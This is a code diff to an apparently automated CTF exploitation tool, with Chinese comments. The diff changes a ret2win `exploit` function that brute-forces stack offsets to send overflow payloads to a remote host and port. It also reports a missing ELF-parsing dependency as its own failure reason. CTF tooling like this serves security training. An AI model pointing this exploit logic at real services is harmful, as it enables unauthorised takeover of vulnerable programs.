@@ -110,12 +110,21 @@ def _try_once(host, port, payload, timeout=6.0):
     return out, ""
 
 
-def exploit(path, host, port, offset=0, win_addr=0, report=None, log=None):
-    """ret2win 一键打通。offset=0 时按常见偏移逐个试（会多连几次）。"""
+def exploit(path, host, port, offset=0, win_addr=0, report=None, log=None, offsets=None):
+    """ret2win 一键打通。offset=0 时按常见偏移逐个试（会多连几次）。
+
+    offsets 给一个列表时按给定范围逐个试：远端题没有调试器，偏移只能靠试，
+    范围越宽命中率越高、连接次数也越多，由调用方按题目类型权衡。
+    """
     log = log or (lambda m: None)
     report = report if report is not None else Report(path)
     try:
         info = _elf_info(path)
+    except ImportError as e:
+        # 依赖没装不等于题目打不动：这个结论要能被调用方区分出来，
+        # 否则整批 pwn 会带着「没有后门函数」的假原因收场（现场 N1BOOK 5 题全废即此）。
+        log("[pwn] 缺 ELF 解析依赖（%s）：请用软件自带 python 运行，或 pip install pyelftools" % e)
+        return {"ok": False, "reason": "missing-dep"}
     except Exception as e:
         log("[pwn] ELF 解析失败：%s" % e)
         info = {"is64": True, "pie": False, "nx": True, "win": [], "gadgets": {}, "binsh": []}
@@ -127,7 +136,8 @@ def exploit(path, host, port, offset=0, win_addr=0, report=None, log=None):
         win_addr = info["win"][0][1]
         log("[pwn] 选中关键函数 %s @ 0x%x" % (info["win"][0][0], win_addr))
 
-    offsets = [int(offset)] if offset else COMMON_OFFSETS
+    if offsets is None:
+        offsets = [int(offset)] if offset else COMMON_OFFSETS
     for off in offsets:
         payload = _build_payload(info, win_addr, off)
         log("[pwn] 尝试偏移 %d，payload %d 字节" % (off, len(payload)))
